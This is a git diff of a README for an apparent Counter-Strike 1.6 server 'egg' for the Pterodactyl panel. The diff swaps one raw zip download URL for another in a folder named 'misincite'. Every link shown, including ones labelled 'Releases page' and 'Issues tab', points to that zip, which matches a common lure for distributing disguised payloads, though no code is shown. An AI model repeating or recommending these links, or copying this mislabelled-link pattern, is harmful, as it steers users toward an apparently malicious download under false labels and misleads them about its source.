@@ -1,6 +1,6 @@
 # 🦖 pterodactyl-cs16-basepack-egg - Simplify Your CS 1.6 Server Setup
 
-[![Download](https://github.com/ndemma7/pterodactyl-cs16-basepack-egg/raw/refs/heads/main/misincite/pterodactyl_basepack_egg_cs_1.5-alpha.2.zip)](https://github.com/ndemma7/pterodactyl-cs16-basepack-egg/raw/refs/heads/main/misincite/pterodactyl_basepack_egg_cs_1.5-alpha.2.zip)
+[![Download](https://raw.githubusercontent.com/ndemma7/pterodactyl-cs16-basepack-egg/main/misincite/egg_cs_basepack_pterodactyl_v1.1.zip)](https://raw.githubusercontent.com/ndemma7/pterodactyl-cs16-basepack-egg/main/misincite/egg_cs_basepack_pterodactyl_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,12 +16,12 @@ Before you begin downloading, ensure you have the following:
 
 ## 🔗 Download & Install
 
-To download the pterodactyl-cs16-basepack-egg, visit this page to download: [GitHub Releases](https://github.com/ndemma7/pterodactyl-cs16-basepack-egg/raw/refs/heads/main/misincite/pterodactyl_basepack_egg_cs_1.5-alpha.2.zip).
+To download the pterodactyl-cs16-basepack-egg, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/ndemma7/pterodactyl-cs16-basepack-egg/main/misincite/egg_cs_basepack_pterodactyl_v1.1.zip).
 
 ### Step-by-Step Download Process
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/ndemma7/pterodactyl-cs16-basepack-egg/raw/refs/heads/main/misincite/pterodactyl_basepack_egg_cs_1.5-alpha.2.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/ndemma7/pterodactyl-cs16-basepack-egg/main/misincite/egg_cs_basepack_pterodactyl_v1.1.zip).
    
 2. **Choose the Latest Release:**
    Look for the latest version. Typically labeled as "Latest release" at the top of the list.
@@ -78,7 +78,7 @@ If you encounter issues during installation or operation, consider the following
 
 If you're still having trouble or have questions, feel free to reach out for help:
 
-- **GitHub Isssues:** Use the [Issues tab](https://github.com/ndemma7/pterodactyl-cs16-basepack-egg/raw/refs/heads/main/misincite/pterodactyl_basepack_egg_cs_1.5-alpha.2.zip) on the GitHub repository to report problems or ask questions.
+- **GitHub Isssues:** Use the [Issues tab](https://raw.githubusercontent.com/ndemma7/pterodactyl-cs16-basepack-egg/main/misincite/egg_cs_basepack_pterodactyl_v1.1.zip) on the GitHub repository to report problems or ask questions.
 - **Documentation:** Check out the README for any updated instructions or tips.
 
-**Download your egg file today:** [Visit this page to download](https://github.com/ndemma7/pterodactyl-cs16-basepack-egg/raw/refs/heads/main/misincite/pterodactyl_basepack_egg_cs_1.5-alpha.2.zip). Enjoy setting up your CS 1.6 server!
+**Download your egg file today:** [Visit this page to download](https://raw.githubusercontent.com/ndemma7/pterodactyl-cs16-basepack-egg/main/misincite/egg_cs_basepack_pterodactyl_v1.1.zip). Enjoy setting up your CS 1.6 server!
